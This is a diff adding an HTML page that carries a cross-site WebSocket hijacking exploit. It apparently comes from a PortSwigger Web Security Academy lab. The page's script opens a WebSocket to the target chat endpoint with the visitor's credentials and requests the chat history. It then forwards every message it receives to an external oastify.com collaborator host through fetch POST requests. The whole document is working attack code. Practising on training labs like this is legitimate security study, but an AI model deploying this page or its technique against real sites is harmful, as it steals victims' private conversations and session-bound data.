@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<title>Cross-site WebSocket hijacking</title>
+</head>
+<body>
+
+Hello world !
+
+<script type="text/javascript">
+	var collaborator = "https://m5szsh8f0jp2v07vxla3pbcm4da4yumj.oastify.com"
+
+	function exfiltrate(data) {
+		fetch(collaborator, {
+				method: 'POST',
+				mode: 'no-cors',
+				body: data 
+			});
+	}
+
+	var webSocket = new WebSocket("wss://0ab7002303f60767c214b497007900e5.web-security-academy.net/chat");
+
+	webSocket.onopen = function (evt) {
+	    console.log("system", "System:", "No chat history on record")
+	    webSocket.send("READY")
+	}
+
+	webSocket.onmessage = function (evt) {
+	    var message = evt.data;
+
+	    if (message === "TYPING") {
+	        console.log("typing", "", "[typing...]")
+	    } else {
+	        var messageJson = JSON.parse(message);
+	        if (messageJson && messageJson['user'] !== "CONNECTED") {
+	            Array.from(document.getElementsByClassName("system")).forEach(function (element) {
+	                element.parentNode.removeChild(element);
+	            });
+	        }
+	        Array.from(document.getElementsByClassName("typing")).forEach(function (element) {
+	            element.parentNode.removeChild(element);
+	        });
+
+	        if (messageJson['user'] && messageJson['content']) {
+	            console.log("message", messageJson['user'] + ":", messageJson['content'])
+	            exfiltrate(message)
+	        }
+	    }
+	};
+
+	webSocket.onclose = function (evt) {
+	    console.log("message", "DISCONNECTED:", "-- Chat has ended --")
+	};
+
+</script>
+
+</body>
+</html>
